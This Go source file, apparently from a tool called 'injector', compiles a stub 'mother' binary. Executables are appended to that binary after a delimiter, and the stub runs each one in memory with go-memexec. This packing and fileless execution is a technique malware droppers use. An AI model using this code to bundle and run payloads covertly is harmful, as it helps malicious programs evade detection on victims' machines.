package modules

import (
	"errors"
	"injector/logger"
	"os/exec"

	"github.com/google/uuid"
)

func CreateMother(name string) {

	logger.Log("Creating mother...")

	tmpName := uuid.NewString() + ".go"

	tmpFile := OpenFile(tmpName)

	WriteToFile(tmpName, tmpFile, getMotherProgram())
	tmpFile.Close()

	cmd := exec.Command("go", "build", "-o", "./"+name, tmpName)
	err := cmd.Start()
	if err != nil {
		logger.Fatal(errors.New("Failed to compile mother:" + err.Error()))
	}

	err = cmd.Wait()
	if err != nil {
		logger.Fatal(errors.New("Failed to compile mother:" + err.Error()))
	}

	RemoveFile(tmpName)
}

func AppendToMother(name string, data [][]byte) {

	logger.Log("Appending executables to mother...")

	mother := OpenFile(name)
	defer mother.Close()

	for _, v := range data {
		WriteToFile(name, mother, v)
	}

}

func getMotherProgram() []byte {

	return []byte(

		`package main
	
import (
	"os"
	"strings"
	"io/ioutil"
	"github.com/amenzhinsky/go-memexec"
	"fmt"
)

func main() {

	bytes, _ := ioutil.ReadFile(os.Args[0])
	toString := string(bytes)

	executables := strings.Split(toString, "h$lL@ w@rLd")

	for i := 2; i < len(executables); i++ {

		exe, _ := memexec.New([]byte(executables[i]))
		defer exe.Close()
	
		cmd := exe.Command()
		res, _ := cmd.Output()
		fmt.Print(string(res))
	}
 
}`)
}
